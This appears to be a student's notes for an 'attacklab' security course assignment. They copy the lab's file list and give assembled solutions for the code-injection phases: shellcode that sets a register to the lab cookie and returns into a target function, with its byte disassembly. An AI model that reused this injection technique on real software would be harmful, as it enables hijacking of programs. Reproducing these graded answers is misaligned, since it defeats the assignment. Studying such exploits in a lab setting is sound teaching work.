This file contains materials for one instance of the attacklab.

Files:

    ctarget

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

     cookie.txt

Text file containing 4-byte signature required for this lab instance.

     farm.c

Source code for gadget farm present in this instance of rtarget.  You
can compile (use flag -Og) and disassemble it to look for gadgets.

     hex2raw

Utility program to generate byte sequences.  See documentation in lab
handout.

1.2 SOLUTION

movq $0x59b997fa, %rdi
pushq $0x4017ec
ret 

1.3 SOLUTION

movq $0x6166373939623935, %rax
movq %rax, 8(%rsp)
leaq 8(%rsp), %rdi
pushq $0x4018fa
ret

example.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 b8 35 39 62 39 39 	movabs $0x6166373939623935,%rax
   7:	37 66 61 
   a:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
   f:	48 8d 7c 24 08       	lea    0x8(%rsp),%rdi
  14:	68 fa 18 40 00       	push   $0x4018fa
  19:	c3                   	ret

  
